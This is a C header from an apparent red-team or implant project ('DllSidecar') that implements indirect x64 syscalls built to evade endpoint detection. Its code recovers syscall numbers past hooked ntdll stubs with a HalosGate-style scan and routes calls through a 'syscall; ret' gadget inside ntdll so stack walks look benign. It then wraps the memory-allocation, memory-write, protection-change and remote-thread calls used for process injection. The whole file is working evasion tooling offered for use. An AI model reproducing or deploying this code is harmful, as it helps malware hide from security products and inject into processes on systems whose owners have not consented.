/*
 * DllSidecar — syscalls_indirect.h
 * Indirect syscall stubs (x64). The syscall instruction is executed from
 * within ntdll's own .text via a cached "syscall; ret" gadget, so a
 * stack walk made by an EDR sees the call originate from ntdll rather
 * than from this DLL. SSNs are recovered at runtime with a HalosGate
 * style scan, so prologue-byte hooks installed by user-mode EDRs do
 * not break resolution.
 *
 * Mutually exclusive with syscalls.h (direct path). Include exactly
 * one of the two per generated translation unit.
 *
 * x64 only. On x86 the existing syscalls.h indirect-via-ntdll-stub
 * path is already the canonical approach.
 *
 * @tunelko — BugAInters 2026
 */

#ifndef SYSCALLS_INDIRECT_H
#define SYSCALLS_INDIRECT_H

#include <stdint.h>
#include "dinvoke.h"

#ifndef _WIN64
#error "syscalls_indirect.h is x64-only. Use syscalls.h on x86."
#endif

/* ── NTSTATUS and NT types ── */

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef SYSCALLS_H
typedef LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

/* ── Pre-computed NT API hashes (djb2 case-sensitive) ── */

#ifndef H_NTCREATETHREADEX
#define H_NTCREATETHREADEX       0xCB0C2130UL
#define H_NTALLOCATEVIRTUALMEM   0x6793C34CUL
#define H_NTWRITEVIRTUALMEM      0x95F3A792UL
#define H_NTPROTECTVIRTUALMEM    0x082962C8UL
#define H_NTCLOSE                0x8B8E133DUL
#define H_NTCREATEFILE           0x15A5ECDBUL
#endif

/* ── Cached "syscall; ret" gadget address ──
 *
 * Discovered once during sc_init by scanning ntdll's mapped image, then
 * reused for every indirect call. The trampoline does an indirect jmp to
 * this address so the syscall instruction itself executes from inside
 * ntdll's .text, not from this DLL.
 *
 * The per-call SSN is passed as the first argument to the trampoline, so
 * concurrent calls do not race on it (each call has its own register-
 * level copy). The gadget pointer is set once and treated as read-only
 * after sc_init returns.
 */
static volatile uint64_t g_sci_gadget = 0;

/* ── Pre-resolved per-API SSN cache ── */

typedef struct _SC_INDIRECT_CACHE {
    uint32_t NtAllocateVirtualMemory;
    uint32_t NtWriteVirtualMemory;
    uint32_t NtProtectVirtualMemory;
    uint32_t NtCreateThreadEx;
    uint32_t NtClose;
    PVOID    ntdll_base;
    BOOL     initialized;
} SC_INDIRECT_CACHE;

static SC_INDIRECT_CACHE g_sci = {0};

/*
 * x64 ntdll Nt* stub prologue (Win10 1909+):
 *   4C 8B D1                mov r10, rcx
 *   B8 XX XX 00 00          mov eax, SSN
 *   F6 04 25 ...   01       test byte ptr [0x7ffe0308], 1
 *   75 03                   jne +3
 *   0F 05                   syscall      <- offset 0x12
 *   C3                      ret          <- offset 0x14
 *
 * Two pieces of information come from this layout:
 *   · The 4-byte SSN immediately after the 4C 8B D1 B8 prologue.
 *   · The "syscall; ret" sequence at offset 0x12 within ANY unhooked
 *     stub, which we reuse as the gadget for every indirect call.
 */

static BOOL sci_stub_unhooked(BYTE *p) {
    return p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8;
}

/* HalosGate: if the resolved stub is hooked, walk 20 neighbours back
 * and forward in 0x20-byte strides until we find an intact prologue.
 * Recover the SSN by adjusting with the index offset (Zw* SSNs are
 * monotonic and contiguous). */
static uint32_t sci_resolve_ssn(PVOID ntdll_base, unsigned long func_hash) {
    BYTE *orig = (BYTE *)dinvoke_get_proc(ntdll_base, func_hash);
    if (!orig) return (uint32_t)-1;

    if (sci_stub_unhooked(orig))
        return *(uint32_t *)(orig + 4);

    for (int i = 1; i < 20; i++) {
        BYTE *probe = orig - (ptrdiff_t)(0x20 * i);
        if (sci_stub_unhooked(probe))
            return *(uint32_t *)(probe + 4) + (uint32_t)i;
    }
    for (int i = 1; i < 20; i++) {
        BYTE *probe = orig + (ptrdiff_t)(0x20 * i);
        if (sci_stub_unhooked(probe))
            return *(uint32_t *)(probe + 4) - (uint32_t)i;
    }
    return (uint32_t)-1;
}

/* Scan ntdll's mapped image for the first "syscall; ret" (0F 05 C3)
 * sequence. Cached for the lifetime of the process. Linear scan over
 * ~2 MB is fast enough to run once during DllMain. */
static uint64_t sci_find_gadget(PVOID ntdll_base) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)ntdll_base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)ntdll_base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    DWORD imgSize = nt->OptionalHeader.SizeOfImage;
    BYTE *p = (BYTE *)ntdll_base;
    if (imgSize < 3) return 0;
    for (DWORD i = 0; i < imgSize - 3; i++) {
        if (p[i] == 0x0F && p[i+1] == 0x05 && p[i+2] == 0xC3)
            return (uint64_t)(p + i);
    }
    return 0;
}

static BOOL sc_init(void) {
    if (g_sci.initialized) return TRUE;

    g_sci.ntdll_base = dinvoke_get_module(H_NTDLL_DLL);
    if (!g_sci.ntdll_base) return FALSE;

    g_sci_gadget = sci_find_gadget(g_sci.ntdll_base);
    if (!g_sci_gadget) return FALSE;

    g_sci.NtAllocateVirtualMemory = sci_resolve_ssn(g_sci.ntdll_base, H_NTALLOCATEVIRTUALMEM);
    g_sci.NtWriteVirtualMemory    = sci_resolve_ssn(g_sci.ntdll_base, H_NTWRITEVIRTUALMEM);
    g_sci.NtProtectVirtualMemory  = sci_resolve_ssn(g_sci.ntdll_base, H_NTPROTECTVIRTUALMEM);
    g_sci.NtCreateThreadEx        = sci_resolve_ssn(g_sci.ntdll_base, H_NTCREATETHREADEX);
    g_sci.NtClose                 = sci_resolve_ssn(g_sci.ntdll_base, H_NTCLOSE);

    g_sci.initialized = TRUE;
    return TRUE;
}

/* ──────────────────────────────────────────────────────────
 *  Indirect trampoline.
 *
 *  Convention (matches the existing sc_NtFoo wrappers below):
 *    rcx = SSN, rdx = arg1, r8 = arg2, r9 = arg3, [rsp+0x28] = arg4,
 *    [rsp+0x30] = arg5, ...
 *
 *  The trampoline shifts arguments left so arg1 ends up in rcx (and
 *  r10, since the kernel reads first arg from r10), arg2 in rdx, arg3
 *  in r8, arg4 in r9, then jumps to the cached "syscall; ret" gadget
 *  inside ntdll. Stack args (arg5+) are copied down by 8 bytes.
 *
 *  Because the final instruction is a jmp (not a call), the gadget's
 *  ret pops THIS function's caller's return address, returning a
 *  syscall result in rax exactly as a direct syscall would.
 * ────────────────────────────────────────────────────────── */
__attribute__((naked)) static NTSTATUS do_syscall_indirect(DWORD ssn, ...) {
    __asm__ (
        "mov %ecx, %eax\n"           /* eax = SSN */
        "mov %rdx, %rcx\n"           /* shift: arg1 -> rcx */
        "mov %r8,  %rdx\n"           /* shift: arg2 -> rdx */
        "mov %r9,  %r8\n"            /* shift: arg3 -> r8  */
        "mov 0x28(%rsp), %r9\n"      /* shift: arg4 from stack -> r9 */
        "mov %rcx, %r10\n"           /* syscall ABI: first arg in r10 */
        /* Copy further stack args down by one slot. */
        "mov 0x30(%rsp), %r11\n"
        "mov %r11, 0x28(%rsp)\n"
        "mov 0x38(%rsp), %r11\n"
        "mov %r11, 0x30(%rsp)\n"
        "mov 0x40(%rsp), %r11\n"
        "mov %r11, 0x38(%rsp)\n"
        "mov 0x48(%rsp), %r11\n"
        "mov %r11, 0x40(%rsp)\n"
        "mov 0x50(%rsp), %r11\n"
        "mov %r11, 0x48(%rsp)\n"
        "mov 0x58(%rsp), %r11\n"
        "mov %r11, 0x50(%rsp)\n"
        "mov 0x60(%rsp), %r11\n"
        "mov %r11, 0x58(%rsp)\n"
        "jmp *g_sci_gadget(%rip)\n"  /* indirect jmp into ntdll syscall;ret */
    );
}

/* ── Typed wrappers — names match syscalls.h so callsites are interchangeable ── */

static NTSTATUS sc_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
{
    return do_syscall_indirect(g_sci.NtAllocateVirtualMemory,
        ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

static NTSTATUS sc_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
{
    return do_syscall_indirect(g_sci.NtWriteVirtualMemory,
        ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

static NTSTATUS sc_NtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress,
    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect)
{
    return do_syscall_indirect(g_sci.NtProtectVirtualMemory,
        ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

static NTSTATUS sc_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList)
{
    return do_syscall_indirect(g_sci.NtCreateThreadEx,
        ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
        StartRoutine, Argument, CreateFlags, ZeroBits, StackSize,
        MaximumStackSize, AttributeList);
}

#endif /* SYSCALLS_INDIRECT_H */
